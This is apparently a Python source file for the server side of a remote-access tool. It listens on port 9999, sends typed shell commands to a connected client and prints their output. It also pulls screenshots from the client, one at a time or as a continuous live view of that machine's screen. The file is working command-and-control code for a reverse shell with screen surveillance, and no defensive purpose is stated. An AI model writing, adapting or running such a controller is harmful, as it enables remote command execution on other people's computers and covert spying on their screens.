import socket
import sys
import cv2
import matplotlib.pyplot as plt
import matplotlib.image as mpimg
import os

host = ""
port = 9999
s = None

path_base = os.getcwd()
path_tempp = os.path.join(path_base, 'tempp.png')

def create_socket():
    global s
    s = socket.socket()
    
def bind_socket() :
    global s
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)      # Pdna Pdega
    s.bind((host,port))
    s.listen(10)
    

def socket_accept():
    conn, address = s.accept()
    print("IP of the client = " + address[0] + " & Port of the client = "+ str(address[1]))
    send_commands(conn)
    
def send_commands(conn) :
    while True :
        cmd = input()
        if cmd == 'quit' :
            conn.send('quit'.encode())
            conn.close()
            s.close()
            break
        elif cmd == 's' :
            conn.send(str.encode(cmd))
            ss_size = int(str(conn.recv(2048),"utf-8"))
            conn.send(str.encode('Ready_to_recv_ss'))
            x = b''
            while len(x) <  ss_size:
                x+= conn.recv(1024)
            ofile = open(path_tempp, 'wb')
            ofile.write(x)
            ofile.close()
            print("ss transfer complete")
            conn.send('done'.encode())
            client_response = str(conn.recv(1024), "utf-8")
            print("Recieved Complete")
            print(client_response, end = "")
        elif cmd == 'vs':
            plt.ion()
            imgplot = plt.imshow(mpimg.imread(path_tempp))
            while True :
                conn.send(str.encode('s'))
                ss_size = int(str(conn.recv(2048),"utf-8"))
                conn.send(str.encode('Ready_to_recv_ss'))
                x = b''
                while len(x) <  ss_size:
                    x+= conn.recv(1024)
                ofile = open(path_tempp, 'wb')
                ofile.write(x)
                ofile.close()
                print("ss transfer complete")
                conn.send('done'.encode())
                client_response = str(conn.recv(1024), "utf-8")
                print("Recieved Complete")
                print("After this image")
                imgplot.set_data(mpimg.imread(path_tempp))
                plt.draw()
                plt.pause(1)
                #plt.show()
                #print(client_response, end = "")
        elif len(cmd) > 0:
            print("Command Sent by You = " + str(str.encode(cmd),'utf-8'))
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end = "")
    
def main():
    create_socket()
    bind_socket()
    socket_accept()
    
main()
